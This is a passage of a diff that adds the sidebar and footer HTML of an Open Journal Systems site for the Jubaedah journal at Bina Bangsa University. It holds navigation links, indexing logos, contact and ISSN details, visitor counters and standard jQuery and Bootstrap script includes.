+	</div>
+</div>
+<div class="pkp_block block_custom" id="customblock-TEMPLATE">
+	<div class="content">
+		<center>
+<p><a href="https://drive.google.com/file/d/1ruDcDKjKReVSkFGeu6h-VoTDIM1CpBe4/view?usp=sharing" target="_blank" rel="noopener"><img src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/sas.png" alt="" width="160" height="97"></a></p>
+</center>
+	</div>
+</div>
+<div class="pkp_block block_make_submission">
+	<h2 class="pkp_screen_reader">
+		Make a Submission
+	</h2>
+
+	<div class="content">
+		<a class="block_make_submission_link" href="https://jubaedah.lppmbinabangsa.id/index.php/home/about/submissions">
+			Make a Submission
+		</a>
+	</div>
+</div>
+<div class="pkp_block block_custom" id="customblock-Sidebar">
+	<div class="content">
+		<center><nav>
+<ul style="list-style-type: none; padding: 0; margin: 0; width: 250px; background-color: #14875c;">
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/about/submissions">Author Guidelines</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/about/editorialTeam">Editorial Team</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/LOR" target="_blank" rel="noopener">List of Reviewers</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/about">Focus and Scope</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/about/aboutThisPublishingSystem">Publishing Process</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/APC">Author(s) Fee</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/about/contact">Contact Us</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/crn">Copyright Notice</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/prp">Peer Review Process </a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="http://jubaedah.lppmbinabangsa.id/index.php/home/sp">Screening Plagiarism </a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="https://jubaedah.lppmbinabangsa.id/index.php/home/archiving">Archiving Policy</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="https://jubaedah.lppmbinabangsa.id/index.php/home/PulicationEthics">Publication Ethics</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="https://jubaedah.lppmbinabangsa.id/index.php/home/indexing">Abstracting &amp; Indexing</a></strong></li>
+<li style="border-bottom: 1px #ffff solid; height: 50px; background-color: #384438;"><strong><a style="display: block; padding: 10px; text-align: center; color: #ffff;" href="https://jubaedah.lppmbinabangsa.id/index.php/home/oap">Open Access Policy</a></strong></li>
+</ul>
+</nav></center>
+	</div>
+</div>
+<div class="pkp_block block_custom" id="customblock-menu">
+	<div class="content">
+		<p style="background-color: #384438; color: #ffff;"><strong>&nbsp; Indexing Process<br></strong></p>
+<p><a href="https://doaj.org/toc/2776-382X" target="_blank" rel="noopener"><img src="https://www.jubaedah.lppmbinabangsa.id/public/site/images/Admin123/logo-doaj2.png" alt="" width="395" height="128"></a><a href="https://scholar.google.co.id/citations?hl=id&amp;user=uyvpUhcAAAAJ" target="_blank" rel="noopener"><img src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/googlescholar.png" alt="" width="222" height="77"></a><a href="https://search.crossref.org/?q=2776-382x&amp;from_ui=yes" target="_blank" rel="noopener"><img src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/crossref.png" alt="" width="222" height="77"></a><a href="https://garuda.kemdikbud.go.id/journal/view/22114" target="_blank" rel="noopener"><img src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/garuda.png" alt="" width="222" height="77"></a><a href="https://app.dimensions.ai/discover/publication?and_facet_source_title=jour.1409257" target="_blank" rel="noopener"><img src="https://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/dimension.png" alt="" width="222" height="77"></a><a href="https://drive.google.com/file/d/1bu_KWNZ-nLOsociNj0r8huD3lu3_FDWd/view?usp=sharing" target="_blank" rel="noopener"><img src="https://lebesgue.lppmbinabangsa.id/public/site/images/Admin123/sinta-4.png" alt="" width="373" height="135"></a><br><br><br></p>
+<p style="background-color: #384438; color: #ffff;"><strong>&nbsp;&nbsp; Contact Person<br></strong></p>
+<p style="text-align: center;"><a href="https://api.whatsapp.com/send?phone=6281212263480&amp;amp;text=Saya%20tertarik%20untuk%20Publish%20artikel%20di%20Jurnal%20Jubaedah"><img src="http://valuasi.lppmbinabangsa.id/public/site/images/Admin123/-41601410372bv9vartupa.png" alt="" width="90" height="90"></a></p>
+<p style="background-color: #384438; color: #ffff;"><strong>&nbsp;&nbsp; Reference Tools</strong></p>
+<p style="text-align: center;"><a title="Lebesgue M" href="https://www.mendeley.com/?interaction_required=true" target="_blank" rel="noopener"><img src="http://lebesgue.lppmbinabangsa.id/public/site/images/Admin123/ref-mendeley1.png" width="150" height="31"></a></p>
+<p style="text-align: center;"><a title="Lebesgue T" href="https://www.turnitin.com/" target="_blank" rel="noopener"><img src="http://lebesgue.lppmbinabangsa.id/public/site/images/Admin123/ref-turnitin.png" width="150" height="41"></a></p>
+<p style="text-align: center;"><a title="Lebesgue G" href="https://www.grammarly.com/?q=brand&amp;utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=brand_f1&amp;utm_content=229881030226&amp;utm_term=grammarly&amp;matchtype=e&amp;placement=&amp;network=g&amp;gclid=Cj0KCQiAoIPvBRDgARIsAHsCw0-2gWMPXcB5toMVIwUUGIKQxb9yLbQ3n0i824AXppgOdc-gWyX0gd4aAvB1EALw_wcB" target="_blank" rel="noopener"><img src="http://lebesgue.lppmbinabangsa.id/public/site/images/Admin123/ref-grammarly.png" width="150" height="41"></a></p>
+<p style="background-color: #384438; color: #ffff;"><strong>&nbsp;&nbsp; ISSN Journal<br></strong></p>
+<p style="text-align: center;"><a href="https://issn.lipi.go.id/terbit/detail/20210419541401440" target="_blank" rel="noopener"><img src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/barcode-2776382x00.png" alt="" width="206" height="90"></a></p>
+<p style="text-align: center;"><a href="https://issn.lipi.go.id/terbit/detail/20210419581554733" target="_blank" rel="noopener"><img src="http://jubaedah.lppmbinabangsa.id/public/site/images/Admin123/barcode-2776383800.png" alt="" width="206" height="90"></a></p>
+	</div>
+</div>
+
+			</div><!-- pkp_sidebar.left -->
+			</div><!-- pkp_structure_content -->
+
+<div class="pkp_structure_footer_wrapper" role="contentinfo">
+	<a id="pkp_content_footer"></a>
+
+	<div class="pkp_structure_footer">
+
+					<div class="pkp_footer_content">
+				<p><strong>Managed by Faculty of Teacher Training and Education</strong><strong><br />Published by LP2M<br />Bina Bangsa University<br />Jl. Raya Serang – Jakarta KM.3 No.1B (Pakupatan) Kota Serang Provinsi Banten<br />Telp. (0254) 220158; Fax. (0254) 220157<br />Email : jubaedahjournal@gmail.com atau admin@lppmbinabangsa.id</strong></p>
+<p><a href="https://info.flagcounter.com/1JBB"><img src="https://s01.flagcounter.com/count2/1JBB/bg_FFFFFF/txt_000000/border_CCCCCC/columns_8/maxflags_250/viewers_0/labels_0/pageviews_0/flags_0/percent_0/" alt="Flag Counter" border="0" /></a></p>
+<p><a title="web statistics" href="http://statcounter.com/" target="_blank" rel="noopener"><img style="border: none;" src="http://c.statcounter.com/12445532/0/a376c17e/0/" alt="View MyStat" /></a> <br /><a href="http://statcounter.com/p12445532/?guest=1" target="_blank" rel="noopener">View Jubaedah Stat</a></p>
+<p><a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license"><img style="border-width: 0;" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" alt="Creative Commons License" /></a><br />This work is licensed under a <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.</p>
+			</div>
+		
+		<div class="pkp_brand_footer" role="complementary">
+			<a href="https://jubaedah.lppmbinabangsa.id/index.php/home/about/aboutThisPublishingSystem">
+				<img alt="More information about the publishing system, Platform and Workflow by OJS/PKP." src="https://jubaedah.lppmbinabangsa.id/templates/images/ojs_brand.png">
+			</a>
+		</div>
+	</div>
+</div><!-- pkp_structure_footer_wrapper -->
+
+</div><!-- pkp_structure_page -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js?v=3.2.1.1" type="text/javascript"></script><script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.12.0/jquery-ui.min.js?v=3.2.1.1" type="text/javascript"></script><script src="https://jubaedah.lppmbinabangsa.id/lib/pkp/js/lib/jquery/plugins/jquery.tag-it.js?v=3.2.1.1" type="text/javascript"></script><script src="https://jubaedah.lppmbinabangsa.id/plugins/themes/default/js/lib/popper/popper.js?v=3.2.1.1" type="text/javascript"></script><script src="https://jubaedah.lppmbinabangsa.id/plugins/themes/default/js/lib/bootstrap/util.js?v=3.2.1.1" type="text/javascript"></script><script src="https://jubaedah.lppmbinabangsa.id/plugins/themes/default/js/lib/bootstrap/dropdown.js?v=3.2.1.1" type="text/javascript"></script><script src="https://jubaedah.lppmbinabangsa.id/plugins/themes/default/js/main.js?v=3.2.1.1" type="text/javascript"></script>
+
+
+</body>
+</html>
